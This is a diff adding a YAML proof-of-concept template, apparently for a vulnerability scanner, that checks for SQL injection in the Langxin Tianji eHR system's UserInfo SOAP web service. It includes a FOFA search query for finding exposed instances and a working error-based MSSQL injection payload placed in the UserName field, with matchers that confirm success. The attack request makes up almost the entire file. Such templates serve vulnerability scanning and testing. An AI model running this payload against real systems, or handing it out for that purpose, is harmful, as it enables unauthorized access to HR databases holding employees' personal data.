@@ -1,0 +1,26 @@
+id: poc-yaml-hrsoft-ehr-userinfo-sqli
+info:
+  name: 朗新天霁eHR UserInfo SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 朗新天霁人力资源管理系统
+  fofa: body="/default.aspx?ReturnUrl=%2f" && body="silverlight"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: POST
+  path: /ws/ZFMCWs/ZFMCWebService.asmx
+  headers:
+    Content-Type: text/xml; charset=utf-8
+    SOAPAction: '"http://tempuri.org/UserInfo"'
+  data: "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\
+    \ xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\"\
+    >\n  <soap:Body>\n    <UserInfo xmlns=\"http://tempuri.org/\">\n      <UserName>')\
+    \ AND 1004 IN (SELECT +sys.fn_varbintohexstr(hashbytes('MD5','{{.t1}}')))-- OOxB</UserName>\n\
+    \      <DeptName>rt</DeptName>\n    </UserInfo>\n  </soap:Body>\n</soap:Envelope>"
+  expression: "status_code == 200 && \ncontains(body,\"SqlException\") &&\ncontains(body,\"\
+    0x\" + t2) &&\ncontains(content_type,\"text/xml\") &&\nmatches(body,\"转换成数据类型(.*?)时失败\"\
+    ) &&\nmatches(body,\"在将(.*?)值\")\n"
+transport: http
